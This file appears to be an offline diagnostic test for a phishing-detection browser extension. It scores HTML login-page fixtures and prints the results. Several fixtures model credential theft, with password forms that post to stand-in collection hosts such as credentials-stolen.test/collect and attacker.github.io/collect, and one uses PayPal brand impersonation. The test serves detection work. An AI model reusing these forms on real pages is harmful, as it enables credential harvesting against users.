// Offline diagnostic fixtures. No URLs are fetched and no page scripts are executed.
// Real worker/popup/navigation behavior is tested in runtime-integration.test.js.
const fs = require('node:fs');
const path = require('node:path');
const extract = require('../../extension/tests/unit/extract-fixture.cjs');
const { scoreEvidence, POLICY_VERSION } = require('../../extension/src/shared/model-policy.js');
const { FEATURE_SCHEMA_VERSION } = require('../../extension/src/shared/feature-schema.js');
const baseline = JSON.parse(fs.readFileSync(path.join(__dirname, 'login-probe-results.json'), 'utf8').replace(/^\uFEFF/, ''));
const before = new Map(baseline.results.map((row) => [row.name, row]));
const login = '<form action="/auth" method="post"><input type="password"></form>';
const validation = '<script>document.querySelector("input").addEventListener("input", () => {});</script>';
const fixtures = [
  { name: 'ordinary college login', url: 'https://college.example/login',
    html: '<title>College Portal</title>' + login },
  { name: 'ordinary login with input validation', url: 'https://college.example/login',
    html: '<title>College Portal</title>' + login + validation },
  { name: 'official Google plain login at root path', url: 'https://accounts.google.com/',
    html: '<title>Google Account</title><p>Sign in to Google</p>' + login },
  { name: 'same official Google login at login path', url: 'https://accounts.google.com/login',
    html: '<title>Google Account</title><p>Sign in to Google</p>' + login },
  { name: 'Apple substring in Pineapple Club', url: 'https://college.example/login',
    html: '<title>Pineapple Club</title>' + login },
  { name: 'brand mentioned only in return URL',
    url: 'https://github.com/login?return_to=%2Ftopics%2Fpaypal',
    html: '<title>Sign in to GitHub</title>' + login },
  { name: 'two brands in official Microsoft title',
    url: 'https://login.microsoftonline.com/',
    html: '<title>Microsoft - sign in using Google</title>' + login },
  { name: 'official Google homepage with validation and visible iframe',
    url: 'https://accounts.google.com/',
    html: '<title>Google</title><p>Google sign in</p>' + login + validation
      + '<iframe src="/help"></iframe>' },
  { name: 'official Google homepage with iframe and three CSRF fields',
    url: 'https://accounts.google.com/',
    html: '<title>Google</title><p>Google sign in</p>' + login
      + '<iframe src="/help"></iframe><input type="hidden"><input type="hidden"><input type="hidden">' },
  { name: 'cross-domain target trusted through page text',
    url: 'https://phish.example/login',
    html: '<title>Member Portal</title><p>credentials-stolen.test</p>'
      + '<form action="https://credentials-stolen.test/collect" method="post"><input type="password"></form>' },
  { name: 'different github.io tenants treated as same site',
    url: 'https://victim.github.io/login',
    html: '<title>Member Portal</title><form action="https://attacker.github.io/collect" method="post"><input type="password"></form>' },
  { name: 'score label conflicts with category gate',
    url: 'https://192.0.2.1/login?next=%2Faccount%2Fsignin&padding=' + 'a'.repeat(180),
    html: '<title>Member Portal</title>' + login },
  { name: 'controlled brand impersonation and external destination',
    url: 'https://members.example/login',
    html: '<title>PayPal Login</title><form action="https://collect.example.org/" method="post"><input type="password"></form>' },
  { name: 'controlled external credential transport downgrade',
    url: 'https://members.example/login',
    html: '<title>Member Portal</title><form action="http://collect.example.org/" method="post"><input type="password"></form>' }
];

const results = fixtures.map((fixture) => {
  const features = extract(fixture.html, fixture.url);
  const verdict = scoreEvidence(features);
  return {
    name: fixture.name,
    beforeScore: before.get(fixture.name)?.score ?? null,
    score: verdict.score, outcome: verdict.outcome, warning: verdict.warning,
    categories: verdict.categories, reasons: verdict.reasons,
    contextsChecked: verdict.credentialContextsChecked,
    extracted: Object.fromEntries(['brand_domain_mismatch', 'is_official_brand_domain',
      'credential_submission_script', 'cross_domain_form_action', 'hidden_iframe_count',
      'frontpage_suspicious_signal_count'].map((key) => [key, features[key]]))
  };
});
console.log(JSON.stringify({ fixtureOnly: true, featureSchemaVersion: FEATURE_SCHEMA_VERSION,
  policyVersion: POLICY_VERSION, modelInfluence: 'none_pending_compatible_calibration', results }, null, 2));
